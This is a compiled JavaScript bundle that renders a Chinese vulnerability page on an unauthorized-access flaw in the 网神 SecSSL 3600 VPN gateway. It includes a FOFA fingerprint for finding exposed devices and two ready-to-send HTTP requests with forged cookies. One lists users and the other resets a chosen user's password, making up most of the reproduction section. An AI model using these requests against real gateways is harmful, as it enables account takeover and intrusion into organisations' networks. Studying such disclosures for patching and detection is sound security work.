(window.webpackJsonp=window.webpackJsonp||[]).push([[224],{1568:function(s,a,t){s.exports=t.p+"assets/img/1683194562640-b489ef43-07a3-45a1-8bd9-c7b311c1c0c0.4cab0093.png"},1569:function(s,a,t){s.exports=t.p+"assets/img/1683194650093-f31de8b5-b20e-46c4-b967-dc2d5007f861.14cf0b7a.png"},1570:function(s,a,t){s.exports=t.p+"assets/img/1683194784648-9c5a03d8-e44c-406e-94f8-15bb299bc2a4.49b5bcf3.png"},3126:function(s,a,t){"use strict";t.r(a);var r=t(65),e=Object(r.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"网神-secssl-3600安全接入网关系统-未授权访问漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网神-secssl-3600安全接入网关系统-未授权访问漏洞"}},[s._v("#")]),s._v(" 网神 SecSSL 3600安全接入网关系统 未授权访问漏洞")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("网神 SecSSL 3600安全接入网关系统 存在未授权访问漏洞，攻击者通过漏洞可以获取用户列表，并修改用户账号密码")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("网神 SecSSL 3600安全接入网关系统  ")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('app="安全接入网关SecSSLVPN" ')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("登陆页面")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1568),alt:"img"}})]),s._v(" "),a("p",[s._v("验证POC，获取用户列表zkec")]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[s._v("GET "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("admin"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("group")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("x_group"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("php?id"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("\n\nCookie: admin_id"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" gw_admin_ticket"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1569),alt:"img"}})]),s._v(" "),a("p",[s._v("修改用户密码")]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[s._v("POST "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("changepass"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("php?"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" \n\nCookie: admin_id"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" gw_user_ticket"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("ffffffffffffffffffffffffffffffff"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" last_step_param"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("{"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"this_name"')]),s._v(":"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"ceshi"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"subAuthId"')]),s._v(":"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"1"')]),s._v("}\nold_pass"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("password"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("Asd123"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("@"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#123A&repassword=Asd123!@#123A")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1570),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);